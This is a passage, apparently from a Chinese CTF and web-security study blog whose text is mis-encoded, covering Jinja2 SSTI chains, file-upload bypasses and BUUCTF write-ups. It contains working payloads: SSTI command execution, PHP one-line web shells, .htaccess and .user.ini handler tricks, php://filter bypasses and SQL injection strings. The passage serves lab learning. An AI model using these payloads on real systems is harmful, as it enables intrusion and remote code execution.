flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for.__globals__['__builtins__']å«æœ‰current_appã€‚get_flashed_messages flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for.__globals__['__builtins__']å«æœ‰current_appã€‚lipsum flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”lipsum.__globals__å«æœ‰osæ¨¡å—ï¼š{{lipsum.__globals__['os'].popen('ls').read()}}current_app åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œä¸€ä¸ªå…¨å±€å˜é‡ã€‚request å¯ä»¥ç”¨äºè·å–å­—ç¬¦ä¸²æ¥ç»•è¿‡ï¼ŒåŒ…æ‹¬ä¸‹é¢è¿™äº›ï¼Œå¼•ç”¨ä¸€ä¸‹ç¾½å¸ˆå‚…çš„ã€‚æ­¤å¤–ï¼ŒåŒæ ·å¯ä»¥è·å–openå‡½æ•°:request.__init__.__globals__['__builtins__'].open('/proc\\self\\fd/3').read()request.args.x1 getä¼ å‚request.values.x1 æ‰€æœ‰å‚æ•°request.cookies cookieså‚æ•°request.headers è¯·æ±‚å¤´å‚æ•°request.form.x1 postä¼ å‚ (Content-Type:applicaation/x-www-form-urlencodedæˆ–multipart/form-data)request.data postä¼ å‚ (Content-Type:a/b)request.json postä¼ json (Content-Type: application/json)config å½“å‰applicationçš„æ‰€æœ‰é…ç½®ã€‚æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥è¿™æ ·{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}g {{g}}å¾—åˆ°&lt;flask.g of 'flask_ssti'&gt; æ„é€ é“¾æ€è·¯: æ‰¾åˆ°çˆ¶ç±»&lt;type â€˜objectâ€™&gt; â€”&gt; å¯»æ‰¾å­ç±» â€”&gt; æ‰¾å…³äºå‘½ä»¤æ‰§è¡Œæˆ–è€…æ–‡ä»¶æ“ä½œçš„æ¨¡å—ã€‚ é¦–å…ˆï¼Œéœ€è¦ä¸€ä¸ªç±» ç„¶åï¼Œéœ€è¦è·å¾—objectç±»ï¼Œå› ä¸ºæ‰€æœ‰çš„ç±»éƒ½æ˜¯ç»§æ‰¿è‡ªå®ƒï¼Œå¯ä»¥ç”¨__base__,__mro__[-1]æ‹¿åˆ° â€˜â€™.class.bases[0] &lt;class â€˜objectâ€™&gt; â€˜â€™.class.base &lt;class â€˜objectâ€™&gt; â€˜â€™.class.mro[1] &lt;class â€˜objectâ€™&gt;â€˜â€™.class.mro[-1] &lt;class â€˜objectâ€™&gt; ç„¶åï¼Œéœ€è¦ç”¨__subclasses__()æ‹¿åˆ°å­ç±»åˆ—è¡¨ æœ€åï¼Œåœ¨å­ç±»åˆ—è¡¨é‡Œé¢æ‰¾åˆ°getshellçš„ç±» 0x03 Bypassè¿‡æ»¤è¿™éƒ¨åˆ†ï¼Œå·²ç»æœ‰æ–‡ç« æ•´ç†çš„éå¸¸å¥½äº†ï¼Œä¿ºå°±æ‡’å¾—æ¬è¿äº†ï¼ŒæŒ‚ä¸ªé“¾æ¥ Flask-jinja2 SSTI ä¸€èˆ¬åˆ©ç”¨å§¿åŠ¿ Refenceç»†è¯´Jinja2ä¹‹SSTI&amp;bypassPythoné­”æ³•æ–¹æ³•æŒ‡å— - PyZhPythonï¼šå®ä¾‹è®²è§£Pythonä¸­çš„é­”æ³•å‡½æ•°ï¼ˆé«˜çº§è¯­æ³•ï¼‰Python type()å‡½æ•°ï¼šåŠ¨æ€åˆ›å»ºç±»Pythonçš„MROSSTIæ¨¡æ¿æ³¨å…¥æ€»ç»“","link":"/2022/11/04/ssti%E5%AD%A6%E4%B9%A0/"},{"title":"æ–‡ä»¶ä¸Šä¼ å¤‡å¿˜å½•","text":"0x01 æ–‡ä»¶ä¸Šä¼ -å‰ç«¯æ‹¦æˆª | æ‡‚å¾—éƒ½æ‡‚ï¼Œå‰ç«¯æ‹¦æˆª=æ— æ•ˆæ“ä½œjsæ£€æŸ¥ä»£ç 12345678910111213141516171819//upload-labs level1function checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == &quot;&quot;) { alert(&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;); return false; } //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ var allow_ext = &quot;.jpg|.png|.gif&quot;; //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼  if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) { var errMsg = &quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot; + allow_ext + &quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot; + ext_name; alert(errMsg); return false; }} ä¼ ä¸ªæ­£å¸¸å›¾ï¼Œç„¶åæŠ“åŒ…ä¿®æ”¹å°±è¡Œäº†ã€‚ 0x02 æ–‡ä»¶ä¸Šä¼ -åç«¯æ ¡éªŒMINE | æ‡‚çš„éƒ½æ‡‚ï¼Œè¿˜æ˜¯æ— æ•ˆæ“ä½œåªæ ¡éªŒMIME1$_FILES['upload_file']['type'] == 'image/jpeg') æ— æ•ˆæ“ä½œï¼Œç›´æ¥ä¿®æ”¹å°±å®Œäº‹äº† å¸¸è§MIMETYPE audio/mpeg -&gt; .mp3 application/msword -&gt; .doc application/octet-stream -&gt; .exe application/pdf -&gt; .pdf application/x-javascript -&gt; .js application/x-rar -&gt; .rar application/zip -&gt; .zip image/gif -&gt; .gif image/jpeg -&gt; .jpg / .jpeg image/png -&gt; .png text/plain -&gt; .txt text/html -&gt; .html video/mp4 -&gt; .mp4 0x03 æ–‡ä»¶ä¸Šä¼ -æ‰©å±•åæ ¡éªŒ | ä½ è¿™wafä¿ç†Ÿå—ï¼Ÿå§¿åŠ¿1: é»‘åå•æ ¡éªŒï¼Œä½†é»‘åå•ä¸å…¨å…¶ä»–åç¼€:*.phpã€*.php3ã€*.php4ã€*.PHPã€*.phtmlã€*.pht å§¿åŠ¿2: ç™½åå•æ ¡éªŒï¼Œä½†æ˜¯æœ‰è§£ææ¼æ´æˆªæ–­ç»•è¿‡ /?upload=shell.php%00.jpg -&gt; /?upload=shell.php è§£ææ¼æ´ApacheæœåŠ¡å™¨ä»£ç ä¸­é™åˆ¶äº†æŸäº›åç¼€çš„æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œä½†æ˜¯æœ‰äº›Apacheæ˜¯å…è®¸è§£æå…¶å®ƒåç¼€çš„ï¼Œä¾‹å¦‚åœ¨httpd.confä¸­å¦‚æœé…ç½®æœ‰å¦‚ä¸‹ä»£ç ï¼Œåˆ™èƒ½å¤Ÿè§£æphpå’Œphtmlæ–‡ä»¶ AddType application/x-httpd-php .php .phtml åœ¨Apacheçš„è§£æé¡ºåºä¸­ï¼Œæ˜¯ä»å³åˆ°å·¦å¼€å§‹è§£ææ–‡ä»¶åç¼€çš„ï¼Œå¦‚æœæœ€å³ä¾§çš„æ‰©å±•åä¸å¯è¯†åˆ«ï¼Œå°±ç»§ç»­å¾€å·¦åˆ¤æ–­ï¼Œç›´åˆ°é‡åˆ°å¯ä»¥è§£æçš„æ–‡ä»¶åç¼€ä¸ºæ­¢ã€‚å› æ­¤ï¼Œä¾‹å¦‚ä¸Šä¼ çš„æ–‡ä»¶åä¸º1.php.xxxxï¼Œå› ä¸ºåç¼€xxxxä¸å¯è§£æï¼Œæ‰€ä»¥å‘å·¦è§£æåç¼€phpã€‚ ä¾‹å¦‚ï¼šshell.php.qwe.asd -&gt;shell.php NginxNginxé»˜è®¤æ˜¯ä»¥CGIçš„æ–¹å¼æ”¯æŒPHPè§£æçš„ï¼Œæ™®éçš„åšæ³•æ˜¯åœ¨Nginxé…ç½®æ–‡ä»¶ä¸­é€šè¿‡ æ­£åˆ™åŒ¹é…è®¾ç½®SCRIPT_FILENAMEã€‚å½“è®¿é—®www.xxx.com/phpinfo.jpg/1.phpè¿™ä¸ª URLæ—¶ï¼Œ$fastcgi_script_nameä¼šè¢«è®¾ç½®ä¸ºâ€œphpinfo.jpg/1.phpâ€ï¼Œç„¶åæ„é€ æˆ SCRIPT_FILENAMEä¼ é€’ç»™PHP CGIã€‚ åŸå› æ˜¯å¼€å¯äº† fix_pathinfo è¿™ä¸ªé€‰é¡¹ï¼Œä¼šè§¦å‘ åœ¨PHPä¸­çš„å¦‚ä¸‹é€»è¾‘ï¼š PHPä¼šè®¤ä¸ºSCRIPT_FILENAMEæ˜¯phpinfo.jpgï¼Œè€Œ1.phpæ˜¯PATH_INFOï¼Œæ‰€ä»¥å°±ä¼š å°†phpinfo.jpgä½œä¸ºPHPæ–‡ä»¶æ¥è§£æäº†ã€‚ å½¢å¼ï¼š www.xxxx.com/UploadFiles/image/1.jpg/1.php www.xxxx.com/UploadFiles/image/1.jpg%00.php www.xxxx.com/UploadFiles/image/1.jpg/%20\\0.php å¦ä¸€ç§æ–¹æ³•ï¼šä¸Šä¼ ä¸€ä¸ªåå­—ä¸ºtest.jpgï¼Œç„¶åè®¿é—®test.jpg/.php,åœ¨è¿™ä¸ªç›®å½•ä¸‹å°±ä¼šç”Ÿæˆä¸€å¥è¯æœ¨é©¬shell.phpã€‚ 0x04 æ–‡ä»¶ä¸Šä¼ -å†…å®¹æ£€æµ‹ | è¿™æ–‡ä»¶è¦æ˜¯æœ‰é•¿æœ‰çŸ­ï¼Œæˆ‘ç›´æ¥åƒäº†å®ƒ1.magic number | ä½ ä¸åŠˆå¼€è¿™æ–‡ä»¶å’‹çŸ¥é“å®ƒç†Ÿä¸ç†Ÿå•Š magic numberï¼Œå®ƒå¯ä»¥ç”¨æ¥æ ‡è®°æ–‡ä»¶æˆ–è€…åè®®çš„æ ¼å¼ï¼Œå¾ˆå¤šæ–‡ä»¶éƒ½æœ‰å¹»æ•°æ ‡å¿—æ¥è¡¨æ˜è¯¥æ–‡ä»¶çš„æ ¼å¼ã€‚ 1234GIF89a(...some binary data for image...)&lt;?php phpinfo(); ?&gt;(... skipping the rest of binary data ...) 2.è¿‡æ»¤&lt;?ä»¥åŠphp @eval($_POST[cmd]); //éœ€è¦php.iniå¼€å¯çŸ­æ ‡ç­¾ 3.æ­£åˆ™æ›¿æ¢è€ç”Ÿå¸¸è°ˆï¼ŒåŒå†™ or å…¶ä»– 4.äºŒæ¬¡æ¸²æŸ“ | ä½ TMåŠˆæˆ‘æ–‡ä»¶æ˜¯å§å¯¹æ¸²æŸ“/åŠ è½½æµ‹è¯•çš„æ”»å‡»æ–¹å¼æ˜¯ä»£ç æ³¨å…¥ç»•è¿‡ã€‚ä½¿ç”¨winhexåœ¨ä¸ç ´åæ–‡ä»¶æœ¬èº«çš„æ¸²æŸ“æƒ…å†µä¸‹æ‰¾ä¸€ä¸ªç©ºç™½åŒºè¿›è¡Œå¡«å……ä»£ç ï¼Œä¸€èˆ¬ä¸ºå›¾ç‰‡çš„æ³¨é‡ŠåŒºã€‚å¯¹äºŒæ¬¡æ¸²æŸ“çš„æ”»å‡»æ–¹å¼å°±æ˜¯æ”»å‡»æ–‡ä»¶åŠ è½½å™¨è‡ªèº« 0x05æ–‡ä»¶ä¸Šä¼ -é…ç½®æ–‡ä»¶ | çœ‹ï¼Œå¸é“çŸ³.htaccessåªæ˜¯é€‚ç”¨äºapacheï¼Œå¦‚æœå˜æˆniginxæˆ–è€…iisåˆ™ä¸ä¼šè¢«è§£ææ–‡ä»¶ä¸Šä¼ æ¼æ´ä¹‹.htaccess .htaccessæ–‡ä»¶ï¼ˆâ€œåˆ†å¸ƒå¼é…ç½®æ–‡ä»¶â€ï¼‰æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å°†å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡Apacheçš„AllowOverrideæŒ‡ä»¤æ¥è®¾ç½®ã€‚ å…·ä½“å®ç°ï¼š 1ã€ä¸Šä¼ .htaccessæ–‡ä»¶è‡³æœåŠ¡å™¨ä¸Šä¼ ç›®å½•ï¼Œæ­¤æ—¶apacheåœ¨è§£æè¯¥ç›®å½•ä¸‹çš„phpæ—¶å°†æŒ‰ç…§æ–‡ä»¶è¦æ±‚ã€‚åªè¦æ–‡ä»¶ååŒ¹é…åˆ°æ‰€å®šä¹‰çš„å­—ç¬¦ä¸²ï¼Œå°±ä¼šå°†è¯¥æ–‡ä»¶å½“ä½œphpè§£æã€‚ 123&lt;FilesMatch &quot;shana&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 2ã€ä¸Šä¼ .htaccessæ–‡ä»¶è®¾ç½®çš„å…³é”®å­—çš„æ–‡ä»¶åï¼Œå³ä¸Šä¼ ä¸€ä¸ªé»‘åå•æ²¡æœ‰è¿‡æ»¤çš„éšæ„åç¼€åæ–‡ä»¶ï¼Œä½†æ–‡ä»¶åä¸­ä¸€å®šè¦åŒ…å«shanaï¼Œå¦‚â€shana.jpgâ€ï¼Œå†…å®¹ä¸ºä¸€å¥è¯æœ¨é©¬ã€‚æ­¤æ—¶â€shana.jpgâ€ä¼šè¢«Apacheå½“ä½œphpè§£æã€‚ .user.iniå¾ˆé€šç”¨ 1234//.user.iniGIF89aauto_prepend_file=xxx ä¼šè‡ªåŠ¨åŒ…å«xxx ç³»ç»Ÿç‰¹æ€§ä»…é€‚ç”¨windowså¹³å°windows ç³»ç»Ÿä¼šè‡ªåŠ¨åˆ  æºç ä¸€å¼€å¤©åœ°ç­ï¼Œé€‰æ‹©è§†çª—ä¿å¹³å®‰ 0x06 æ–‡ä»¶ä¸Šä¼ -æ¡ä»¶ç«äº‰ | ä½ æ˜¯æ•…æ„æ¥æ‰¾çŒ¹ï¼Ÿæ–‡ä»¶èƒ½ä¼ ï¼Œä½†æ˜¯ä¼ è¿›å»åå°±ç»™ä½ åˆ äº†ï¼Œé€šå¸¸æƒ…å†µä¸‹éœ€è¦ä¸€è¾¹ä¼ ä¸€è¾¹è®¿é—®,æˆ–è€…åˆ©ç”¨ç¯å¢ƒï¼Œè®©phpè¿Ÿä¸€ç‚¹åˆ æ–‡ä»¶ 0x07 æ–‡ä»¶ä¸Šä¼ -è§£å‹æŠ¥é”™ | ä½ è¿™å‹ç¼©åŒ…æ˜¯é‡‘å­åšçš„è¿˜æ˜¯æ–‡ä»¶æ˜¯é‡‘å­åšçš„è¿™ç§æƒ…å†µè¦æ±‚æ¯”è¾ƒé«˜äº†ï¼Œéœ€è¦åç«¯è§£å‹å‹ç¼©åŒ…Dest0g3 520è¿æ–°èµ› ezipåŸç†:åˆ›å»ºä¸€ä¸ªè§£å‹åˆ°ä¸€åŠä¼šæŠ¥é”™çš„æ–‡ä»¶ï¼Œç„¶åé—ç•™shellæ–‡ä»¶getshell 0x08 æ–‡ä»¶ä¸Šä¼ -è½¯è¿æ¥ä¼ å¿«æ·æ–¹å¼è¿›å»ï¼Œç¦»è°± è¦æ±‚åç«¯ä¼šè§£å‹æ–‡ä»¶ ln -s /flag flag zip -y flag.zip flag 0x09 æ–‡ä»¶ä¸Šä¼ -æ­»äº¡exit | TMDåˆæ°‘ï¼Œæ•¢æ€æˆ‘çš„é©¬ï¼Ÿæƒ…å†µä¸€ file_put_contents($filename,â€&lt;?php exit();â€.$content);ç¼–ç ç»•è¿‡,base64 rot13 balabalafilename=php://filter/convert.base64-decode/resource=shell.php æˆ–è€…å†™åˆ°.htaccess 12filename=php://filter/write=string.strip_tags/resource=.htaccesscontent=?&gt;php_value auto_prepend_file flag.php æƒ…å†µäºŒ file_put_contents($content,â€&lt;?php exit();â€.$content);rot13content=php://filter/string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=shell.phpäºŒæ¬¡ç¼–ç  123456789101112&lt;?php $char = 'r'; #æ„é€ rçš„äºŒæ¬¡ç¼–ç  for ($ascii1 = 0; $ascii1 &lt; 256; $ascii1++) { for ($ascii2 = 0; $ascii2 &lt; 256; $ascii2++) { $aaa = '%'.$ascii1.'%'.$ascii2; if(urldecode(urldecode($aaa)) == $char){ echo $char.': '.$aaa; echo &quot;\\n&quot;; } } } ?&gt; è¿‡æ»¤å™¨åµŒå¥—content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=shell.php base64ç¼–ç content=php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+/../shell.php ç¬¬ä¸‰ç§æƒ…å†µ file_put_contents($content,â€â€œ.\\nxxxxx);`` NaN upload-exp è¿™é‡Œæ”¾ä¸€äº›å¸¸ç”¨çš„æ–‡ä»¶ä¸Šä¼ ï¼Œä¼šç»§ç»­æ›´æ–°1.å‰ç«¯æ–‡ä»¶ä¸Šä¼ 1234&lt;form id=&quot;upload-form&quot; action=&quot;ç›®æ ‡ç½‘ç«™&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; &gt; &lt;input type=&quot;file&quot; id=&quot;upload_file&quot; name=&quot;upload_file&quot; /&gt; &lt;br /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;ä¸Šä¼ &quot; /&gt;&lt;/form&gt; åç«¯æ¥æ”¶ä»£ç  123456789101112131415161718if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; } } else { $msg = 'æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼'; } } else { $msg = UPLOAD_PATH.'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; }}?&gt; **æ³¨:**å‰ç«¯çš„&lt;input type=&quot;file&quot; id=&quot;upload_file&quot; name=&quot;upload_file&quot; /&gt;ä¸­name=upload_fileå¯¹åº”åç«¯ä»£ç çš„$_FILES['upload_file'],å‰ç«¯çš„&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;ä¸Šä¼ &quot; /&gt;ä¸­name=&quot;submit&quot;å¯¹åº”åç«¯ä»£ç çš„isset($_POST['submit']),å®æˆ˜ç¯å¢ƒä¸­è¿˜æ˜¯éœ€è¦å¯¹å…·ä½“ç¯å¢ƒè¿›è¡Œä¸€äº›ä¿®æ”¹ 2. .htaccessæ–‡ä»¶1234567&lt;FilesMatch &quot;shana&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;æˆ–è€…AddType application/x-httpd-php .png 3. .user.iniæ–‡ä»¶1auto_prepend_file=xxx é²æ£’æ€§éå¸¸å¥½ï¼Œç”šè‡³å¯ä»¥ 12GIF89aauto_prepend_file=xxx è‡ªåŠ¨åŒ…å«xxx Refence:ç‹¼ç»„å®‰å…¨å›¢é˜Ÿå…¬å¼€çŸ¥è¯†åº“ upload-labsé€šå…³æ”»ç•¥æ–‡ä»¶ä¸Šä¼ æ€»ç»“æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¹‹.htaccess.user.iniå¯¼è‡´æ–‡ä»¶ä¸Šä¼ ç»•è¿‡phpæ­»äº¡exit()ç»•è¿‡å…³äºfile_put_contentsçš„ä¸€äº›å°æµ‹è¯•","link":"/2022/10/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%87%E5%BF%98%E5%BD%95/"},{"title":"BUUåšé¢˜å¯„å½•","text":"[suctf 2019]EasySQL | sql_modesql æ³¨å…¥ ä¹ä¸€è¯•ï¼Œå¯ä»¥å †å  çœ‹æ ·å­æœ‰è¿‡æ»¤,ç®€å•æµ‹äº†ä¸€ä¸‹ï¼Œè¿‡æ»¤äº†from,information é»‘åå• 1$BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\\&quot;&quot;; æŸ¥è¯¢è¯­å¥ 1select $_GET['query'] || flag from flag è„‘æ´:1234payload1: *,1payload2: 0;set sql_mode=PIPES_AS_CONCAT;select 0è®©sqlæŠŠ || å½“ä½œæ‹¼æ¥ [å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ | å †å ï¼Œæ— select é¢„ç¼–è¯‘ä¸Šæ¥å°±æŠŠé»‘åå•ä¸€æ‘†ï¼Œå¥½åƒå·²ç»æ— æ‡ˆå¯å‡»äº† 1return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject); æµ‹è¯•ä¸€ä¸‹ï¼Œå­—ç¬¦å½¢ åŒå¼•å·emmm,å•¥éƒ½ä¸ä¼šäº†ï¼Œåªèƒ½çœ‹çœ‹wpäº† mysqlé‡Œé¢ï¼Œçˆ†å­—æ®µå¹¶ä¸ä¸€å®šéœ€è¦information_schemaè¿™ä¸ªåº“ 12345678910mysql&gt; show columns from users;+----------+-------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+----------+-------------+------+-----+---------+----------------+| id | int(3) | NO | PRI | NULL | auto_increment || username | varchar(20) | NO | | NULL | || password | varchar(20) | NO | | NULL | |+----------+-------------+------+-----+---------+----------------+3 rows in set (0.00 sec) å—¯å“¼~how å‘½ä»¤æŸ¥çœ‹è¡¨ä¸­çš„ã€Œå­—æ®µã€ï¼Œæ³¨æ„è¡¨åè¦ç”¨åå¼•å·åŒ…è£¹æœ‰ç”¨ é™„: MySQLä¸“æœ‰æ— selectå¯ç”¨MySQL é™¤äº†å¯ä»¥ä½¿ç”¨ select æŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨ handler è¯­å¥ï¼Œè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œä¸è¿‡handler è¯­å¥å¹¶ä¸å…·å¤‡ select è¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯ MySQL ä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­ã€‚handler è¯­å¥æä¾›é€šå¾€è¡¨çš„ç›´æ¥é€šé“çš„å­˜å‚¨å¼•æ“æ¥å£ï¼Œå¯ä»¥ç”¨äº MyISAM å’Œ InnoDB è¡¨ã€‚ ä¹Ÿå¯ä»¥ä½¿ç”¨é¢„ç¼–è¯‘è½¬æ¢æˆhexç»•è¿‡ [SUCTF 2019]EasySQLå–œæfuzzè„šæœ¬ 12345678910import requests url = &quot;http://7e692c90-6f0b-4aa3-babf-89bb436f6b4f.node4.buuoj.cn:81/&quot;with open('sql-fuzz.txt') as f: for line in f: data = {&quot;query&quot;: line} r = requests.post(url,data=data) if('Nonono' in r.text): print(line.strip(),end=&quot; &quot;) çº¯ç›²æ³¨äº†ï¼Œå•¥éƒ½çœ‹ä¸è§ï¼Œä½†æ˜¯æˆ‘æ„Ÿè§‰è¿™é¢˜çš„ç”»é£æ˜¯é‚£ä¹ˆçš„ä¼¼æ›¾ç›¸è¯†â€¦.. 1;set sql_mode=PIPES_AS_CONCAT;select 1 æ·¦ï¼Œä¸Šä¸€é¢˜ä¸€æ¨¡ä¸€æ ·çš„payload [æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQLæŠ¥é”™æ³¨å…¥ http://0271ebd9-169b-4d78-8475-f6667e20789c.node4.buuoj.cn:81/check.php?username=admin' and updatexml(0x7e,concat(0x7e,database()),0x7e) %23&amp;password=adminâ€™ and sleep(3) è¡¨å: 12geekuser: id,username,password geekåº“l0ve1ysq1: id,username,password geekåº“ admin824fc00cd6f8cd94403b365a80bcfbd cl4ywo_tai_nan_le glzjinglzjin_wants_a_girlfriend Z4cHAr7zCrbiao_ge_dddd_hm æŠ¥é”™æ³¨å…¥ï¼Œç¡¬çˆ† 123http://0271ebd9-169b-4d78-8475-f6667e20789c.node4.buuoj.cn:81/check.php?username=admin' and updatexml(1,concat(0x7e,(select substr((select password from l0ve1ysq1 where username='flag'),30,16)),0x7e),1) %23&amp;password=admin' and sleep(3) [BJDCTF2020]Easy MD5ä¸€çœ¼ä¸çœŸffifdyop ç»•è¿‡ä¸­ä¸€ä¸ªå¥‡å¦™çš„å­—ç¬¦ä¸² ç»è¿‡md5åŠ å¯†åï¼š276f722736c95d99e921722cf9ed621c å†è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼š'or'6&lt;ä¹±ç &gt; å³ 'or'66ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b ç”¨é€”ï¼š select * from admin where password=''or'6&lt;ä¹±ç &gt;' å°±ç›¸å½“äºselect * from admin where password=''or 1 å®ç°sqlæ³¨å…¥ [æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlagç®€å•ï¼Œæ–°æ‰‹æ‘éš¾åº¦cookie + ä¼ å‚ +PHPç‰¹æ€§ [HCTF 2018]admin[æŠ¤ç½‘æ¯ 2018]easy_tornadoéšä¾¿ç‚¹äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œå‘ç°äº†è¿™ä¸ªä¼ å‚ http://62482047-0242-4246-89d7-23f69a549160.node4.buuoj.cn:81/file?filename=/welcome.txt&amp;filehash=a7b1991d198deda606020048ccd83bee æ ¹æ®hints.txtå‘ç°äº†md5(cookie_secret+md5(filename)) cookie_secretè¿™ç©æ„åˆ°åº•æ˜¯ä¸ªå•¥ï¼Œä¿ºä¸çŸ¥é“ï¼Œè‚¯å®šæ²¡æ³•ç ´è§£ ä¸è¿‡é˜´å·®é˜³é”™è®¿é—®åˆ°äº†è¿™ä¸ª http://62482047-0242-4246-89d7-23f69a549160.node4.buuoj.cn:81/error?msg=2 çœ‹æ ·å­æ˜¯pythonæ²™ç®±é€ƒé€¸äº†,ç®€å•fuzzä¸€ä¸‹ï¼Œé€å¿ƒå‡‰ï¼Œå¿ƒé£æ‰¬ æœç´¢ä¸€ä¸‹ï¼Œ http://62482047-0242-4246-89d7-23f69a549160.node4.buuoj.cn:81/error?msg= {'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '6dcbf553-b18a-46ba-9487-8cf74e2c43ca'} [ACTF2020 æ–°ç”Ÿèµ›]Uploadå¾ˆå¥½çœ‹çš„å‰ç«¯emmmphtmç›´æ¥æ¢­ [æå®¢å¤§æŒ‘æˆ˜ 2019]RCE MEå…¸ä¸­å…¸ä¹‹ å–å?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6); ç¦ç”¨å‡½æ•°ï¼Œå…¸ä¸­å…¸ä¹‹UAFè„šæœ¬,èšå‰‘ç›´æ¥æ¢­ [NPUCTF2020]ezincludeä¸Šæ¥é¢˜ç›®æ„ä¹‰ä¸æ˜ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿå³é”®æºä»£ç ï¼Œè¿˜æ²¡çœ‹æ˜ç™½ï¼ŒF12æ‰“å¼€æ§åˆ¶å°çœ‹åˆ°å°é¥¼å¹²ï¼Œæ‡‚äº† flflflflag.php å—¯å“¼ï¼Œ200çŠ¶æ€ç çš„404? bpæŠ“åŒ…ï¼Œåªæ‰¾åˆ°ä¸€ä¸ªæ–‡ä»¶åŒ…å«çš„ä¸œè¥¿ï¼Œä¹‹åå°±æ²¡æœ‰æ€è·¯äº†â€¦emmå·å·ç„äº†ä¸€çœ¼è¾¾ä¸ç•™å±ï¼Œdir.phpæœç„¶æ˜¯å¼€æ‰«å—ï¼Ÿï¼Œä¸è¿‡buuæ²¡æ³•æ‰«äº†ï¼Œå°±å‡è£…æˆ‘æ‰«åˆ°äº†è¿™ä¸ªæ–‡ä»¶å§ å°è¯•æš´åŠ›å°è¯•äº†å¥½ä¹…ï¼Œå‘ç°å¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨ï¼ŒPhpåˆ çš„æ¯”æˆ‘è®¿é—®çš„è¦å¿«ï¼Œå¾ˆå¤´ç–¼ï¼Œç„äº†ä¸€çœ¼ï¼Œå‘ç°æ˜¯string.strip_tagsè¿‡æ»¤å™¨è®©Phpå´©æºƒå°±èƒ½ç•™ä¸‹æ–‡ä»¶ 12345678910111213141516171819202122232425262728import requestsimport base64url = 